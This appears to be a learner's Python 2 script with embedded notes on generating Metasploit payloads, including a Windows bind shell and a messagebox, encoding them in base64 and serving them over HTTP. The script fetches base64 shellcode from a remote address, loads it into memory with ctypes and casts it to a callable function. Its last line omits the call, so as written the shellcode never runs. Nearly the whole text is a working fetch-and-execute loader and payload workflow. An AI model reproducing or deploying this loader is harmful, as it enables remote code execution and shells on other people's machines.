'''
IMPORTANT
https://www.offensive-security.com/metasploit-unleashed/generating-payloads/

msf payload(windows/shell_bind_tcp) > generate -b '\x00' -f /root/goingBlack/shel.txt
[*] Writing 1729 bytes to /root/goingBlack/shel.txt...

root@kali:~/goingBlack# base64 -i shel.txt > shellcode.bin
root@kali:~/goingBlack# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...

'''
'''
https://www.hackingarticles.in/fun-metasploit-payloads/

msf > use windows/messagebox
msf payload(windows/messagebox) > info
msf payload(windows/messagebox) > set text 'amos no me jodas'
text => amos no me jodas
msf payload(windows/messagebox) > set title 'super important message'
title => super important message
 msf payload(windows/messagebox) > generate -t raw -f /root/goingBlack/message.raw
[*] Writing 287 bytes to /root/goingBlack/message.raw...


'''

import urllib2
import ctypes
import base64

# retrieve the shell code from our server
url = "http://192.168.119.18:8000/message.bin"
response = urllib2.urlopen(url)

# decode the shellcode from base 64
shellcode = base64.b64decode(response.read())

# create a buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# create a function pointer to our shellcode
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# call our shellcode
shellcode_func